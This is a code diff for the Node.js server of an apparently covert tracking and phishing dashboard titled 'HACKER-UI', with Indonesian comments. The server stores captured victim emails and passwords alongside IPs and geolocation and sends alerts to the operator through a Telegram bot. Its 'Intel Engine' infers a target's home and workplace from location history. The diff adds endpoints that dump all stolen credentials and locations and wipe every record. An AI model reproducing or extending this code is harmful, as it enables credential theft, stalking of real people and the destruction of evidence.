@@ -1,4 +1,4 @@
-// File: server.js (v7.3 - Final with Intel Engine)
+// File: server.js (v7.9 - With Correct Deletion Order)
 
 require('dotenv').config();
 
@@ -65,7 +65,6 @@ const sendTelegramNotification = async (locationData) => {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     try {
         await axios.post(url, { chat_id: chatId, text: message, parse_mode: 'Markdown' });
-        console.log('✅ Notifikasi Lokasi Telegram berhasil dikirim.');
     } catch (error) {
         console.error('❌ Gagal mengirim notifikasi Lokasi Telegram:', error.response ? error.response.data : error.message);
     }
@@ -93,7 +92,6 @@ const sendCredentialsNotification = async (credData) => {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     try {
         await axios.post(url, { chat_id: chatId, text: message, parse_mode: 'Markdown' });
-        console.log('✅ Notifikasi Kredensial Telegram berhasil dikirim.');
     } catch (error) {
         console.error('❌ Gagal mengirim notifikasi Kredensial Telegram:', error.response ? error.response.data : error.message);
     }
@@ -398,11 +396,17 @@ app.post('/create', protectRoute, async (req, res) => {
 app.delete('/api/links/:id', protectRoute, async (req, res) => {
     const { id } = req.params;
     try {
+        // Hapus dulu data yang bergantung pada link ini
+        await db.promise().query("DELETE FROM credentials WHERE tracker_id = ?", [id]);
+        await db.promise().query("DELETE FROM locations WHERE tracker_id = ?", [id]);
+        // Baru hapus link utamanya
         await db.promise().query("DELETE FROM links WHERE id = ?", [id]);
-        broadcastLogMessage(`> Link [${id}] has been deleted.`);
+
+        broadcastLogMessage(`> Link [${id}] and all its data have been deleted.`);
         broadcastDashboardUpdate();
         res.json({ status: 'success', message: 'Link berhasil dihapus.' });
     } catch (error) {
+        console.error(`Error deleting link ${id}:`, error);
         res.status(500).json({ status: 'error', message: 'Gagal menghapus link.' });
     }
 });
@@ -424,139 +428,161 @@ app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
     }
 });
 
-// ##### PENAMBAHAN FITUR INTEL ENGINE - MULAI #####
-
-// Fungsi untuk menganalisis pola perilaku dari data lokasi
 async function analyzeBehavioralPatterns(userId) {
     try {
-        const [locations] = await db.promise().query(
-            'SELECT latitude, longitude, created_at FROM locations WHERE user_id = ? ORDER BY created_at DESC',
-            [userId]
-        );
-
-        if (locations.length < 10) { // Butuh data yang cukup untuk analisis
-            return { home: null, work: null, anomalies: [], message: 'Insufficient location data for analysis.' };
-        }
-
-        // 1. Clustering Sederhana: Kelompokkan lokasi yang berdekatan
+        const [locations] = await db.promise().query('SELECT latitude, longitude, created_at FROM locations WHERE user_id = ? ORDER BY created_at DESC', [userId]);
+        if (locations.length < 10) { return { home: null, work: null, anomalies: [], message: 'Insufficient location data for analysis.' }; }
         const locationClusters = {};
         locations.forEach(loc => {
-            // Bulatkan koordinat untuk mengelompokkan titik yang sangat dekat (presisi ~111 meter)
             const clusterId = `${loc.latitude.toFixed(3)},${loc.longitude.toFixed(3)}`;
             if (!locationClusters[clusterId]) {
-                locationClusters[clusterId] = {
-                    lat: loc.latitude,
-                    lon: loc.longitude,
-                    points: []
-                };
+                locationClusters[clusterId] = { lat: loc.latitude, lon: loc.longitude, points: [] };
             }
             locationClusters[clusterId].points.push(new Date(loc.created_at));
         });
-
-        // Urutkan cluster berdasarkan jumlah titik (frekuensi kunjungan)
         const sortedClusters = Object.values(locationClusters).sort((a, b) => b.points.length - a.points.length);
-
-        let potentialHome = null;
-        let potentialWork = null;
-
-        // 2. Analisis Waktu untuk setiap cluster teratas
-        for (const cluster of sortedClusters.slice(0, 5)) { // Analisis 5 lokasi paling sering dikunjungi
-            let homeScore = 0;
-            let workScore = 0;
-
+        let potentialHome = null, potentialWork = null;
+        for (const cluster of sortedClusters.slice(0, 5)) {
+            let homeScore = 0, workScore = 0;
             cluster.points.forEach(date => {
-                const day = date.getDay(); // 0 = Minggu, 6 = Sabtu
-                const hour = date.getHours();
-
-                // Cek jam "rumah" (20:00 - 07:00 atau akhir pekan)
-                if (hour >= 20 || hour < 7 || day === 0 || day === 6) {
-                    homeScore++;
-                }
-
-                // Cek jam "kantor" (Senin-Jumat, 09:00 - 17:00)
-                if (day > 0 && day < 6 && hour >= 9 && hour <= 17) {
-                    workScore++;
-                }
+                const day = date.getDay(), hour = date.getHours();
+                if (hour >= 20 || hour < 7 || day === 0 || day === 6) { homeScore++; }
+                if (day > 0 && day < 6 && hour >= 9 && hour <= 17) { workScore++; }
             });
-
-            // Tetapkan sebagai kandidat jika belum ada atau skornya lebih tinggi
             if (!potentialHome || homeScore > potentialHome.score) {
-                if(workScore < homeScore) { // Pastikan tidak tumpang tindih dengan skor kerja
-                    potentialHome = { lat: cluster.lat, lon: cluster.lon, count: cluster.points.length, score: homeScore, points: cluster.points };
-                }
+                if(workScore < homeScore) { potentialHome = { ...cluster, score: homeScore }; }
             }
             if (!potentialWork || workScore > potentialWork.score) {
-                 if(homeScore < workScore) { // Pastikan tidak tumpang tindih dengan skor rumah
-                    potentialWork = { lat: cluster.lat, lon: cluster.lon, count: cluster.points.length, score: workScore, points: cluster.points };
-                }
+                 if(homeScore < workScore) { potentialWork = { ...cluster, score: workScore }; }
             }
         }
-        
-        // Finalisasi: pastikan lokasi kerja dan rumah tidak sama persis
-        if (potentialHome && potentialWork && potentialHome.lat === potentialWork.lat) {
-            if (potentialHome.score > potentialWork.score) {
-                potentialWork = null; // Prioritaskan sebagai rumah jika skor lebih tinggi
-            } else {
-                potentialHome = null; // Prioritaskan sebagai kerja
-            }
+        if (potentialHome && potentialWork && potentialHome.lat.toFixed(3) === potentialWork.lat.toFixed(3)) {
+            if (potentialHome.score > potentialWork.score) { potentialWork = null; } else { potentialHome = null; }
         }
-
-
-        // 3. Deteksi Anomali
         const anomalies = [];
         if (potentialWork) {
             potentialWork.points.forEach(date => {
-                const day = date.getDay();
-                const hour = date.getHours();
-                if (day === 0 || day === 6 || hour > 20 || hour < 6) { // Jika ada di "kantor" di akhir pekan atau tengah malam
-                    anomalies.push(`Anomaly Detected: Presence at [WORK] location on ${date.toLocaleString('id-ID')}.`);
+                const day = date.getDay(), hour = date.getHours();
+                if (day === 0 || day === 6 || hour > 20 || hour < 6) {
+                    anomalies.push(`Anomaly Detected: Presence at [WORK] on ${date.toLocaleString('id-ID')}.`);
                 }
             });
         }
-
         return {
-            home: potentialHome ? { lat: potentialHome.lat, lon: potentialHome.lon, count: potentialHome.count } : null,
-            work: potentialWork ? { lat: potentialWork.lat, lon: potentialWork.lon, count: potentialWork.count } : null,
-            anomalies: anomalies.slice(0, 5) // Batasi 5 anomali teratas
+            home: potentialHome ? { lat: potentialHome.lat, lon: potentialHome.lon, count: potentialHome.points.length } : null,
+            work: potentialWork ? { lat: potentialWork.lat, lon: potentialWork.lon, count: potentialWork.points.length } : null,
+            anomalies: anomalies.slice(0, 5)
         };
-
     } catch (error) {
         console.error("Intel Engine Analysis Error:", error);
         throw error;
     }
 }
 
-
-// Endpoint baru untuk Intel Engine
 app.get('/api/intel/:username', protectRoute, async (req, res) => {
     const { username } = req.params;
     try {
         const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
-        if (users.length === 0) {
-            return res.status(404).json({ error: 'Target user not found' });
-        }
+        if (users.length === 0) { return res.status(404).json({ error: 'Target user not found' }); }
         const userId = users[0].id;
-
-        console.log(`> Running Intel Engine analysis for [${username}]...`);
-        broadcastLogMessage(`> Running Intel Engine analysis for [${username}]...`);
-
         const analysisResult = await analyzeBehavioralPatterns(userId);
-        
-        console.log(`> Analysis for [${username}] complete.`);
-        broadcastLogMessage(`> Analysis for [${username}] complete.`);
-
         res.json(analysisResult);
     } catch (error) {
         res.status(500).json({ error: 'Server error during analysis' });
     }
 });
 
+app.get('/api/alldata/links', protectRoute, async (req, res) => {
+    try {
+        const query = `
+            SELECT l.id, l.original_url, l.created_at, l.expires_at, l.link_type, l.click_count, u.username 
+            FROM links l
+            JOIN users u ON l.user_id = u.id
+            ORDER BY l.created_at DESC`;
+        const [links] = await db.promise().query(query);
+        res.json(links);
+    } catch (error) {
+        console.error("Error fetching all links data:", error);
+        res.status(500).json({ error: 'Database query failed' });
+    }
+});
 
-// ##### PENAMBAHAN FITUR INTEL ENGINE - SELESAI #####
+app.get('/api/alldata/locations', protectRoute, async (req, res) => {
+    try {
+        const query = `
+            SELECT loc.id, loc.tracker_id, loc.latitude, loc.longitude, loc.created_at, loc.ip_address, loc.country, loc.city, loc.isp, u.username
+            FROM locations loc
+            JOIN links l ON loc.tracker_id = l.id
+            JOIN users u ON l.user_id = u.id
+            ORDER BY loc.created_at DESC`;
+        const [locations] = await db.promise().query(query);
+        res.json(locations);
+    } catch (error) {
+        console.error("Error fetching all locations data:", error);
+        res.status(500).json({ error: 'Database query failed' });
+    }
+});
 
+app.get('/api/alldata/credentials', protectRoute, async (req, res) => {
+    try {
+        const query = `
+            SELECT cred.id, cred.tracker_id, cred.email, cred.password, cred.ip_address, cred.created_at, u.username
+            FROM credentials cred
+            JOIN links l ON cred.tracker_id = l.id
+            JOIN users u ON l.user_id = u.id
+            ORDER BY cred.created_at DESC`;
+        const [credentials] = await db.promise().query(query);
+        res.json(credentials);
+    } catch (error) {
+        console.error("Error fetching all credentials data:", error);
+        res.status(500).json({ error: 'Database query failed' });
+    }
+});
+
+app.delete('/api/alldata/location/:id', protectRoute, async (req, res) => {
+    try {
+        await db.promise().query('DELETE FROM locations WHERE id = ?', [req.params.id]);
+        res.json({ message: 'Location record deleted successfully.' });
+    } catch (error) {
+        console.error("Error deleting location:", error);
+        res.status(500).json({ message: 'Failed to delete location record.' });
+    }
+});
+
+app.delete('/api/alldata/credential/:id', protectRoute, async (req, res) => {
+    try {
+        await db.promise().query('DELETE FROM credentials WHERE id = ?', [req.params.id]);
+        res.json({ message: 'Credential record deleted successfully.' });
+    } catch (error) {
+        console.error("Error deleting credential:", error);
+        res.status(500).json({ message: 'Failed to delete credential record.' });
+    }
+});
+
+// ##### [KODE YANG DIPERBAIKI] API Endpoint untuk Menghapus Semua Data #####
+app.delete('/api/alldata/all', protectRoute, async (req, res) => {
+    const connection = db.promise(); 
+    try {
+        await connection.beginTransaction();
+        // Hapus data dari tabel 'anak' terlebih dahulu
+        await connection.query('DELETE FROM credentials');
+        await connection.query('DELETE FROM locations');
+        // Setelah itu baru hapus data dari tabel 'induk'
+        await connection.query('DELETE FROM links');
+        await connection.commit();
+        
+        broadcastDashboardUpdate(); 
+        res.json({ message: 'All tracking data has been wiped successfully.' });
+    } catch (error) {
+        await connection.rollback();
+        console.error("Error wiping all data:", error);
+        // Kirim response error yang valid sebagai JSON
+        res.status(500).json({ message: 'Failed to wipe all data due to a server error.' });
+    }
+});
 
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v7.3 (Final with Intel Engine)`);
+    console.log(`\n HACKER-UI DASHBOARD v7.9 (With Deletion Fix)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
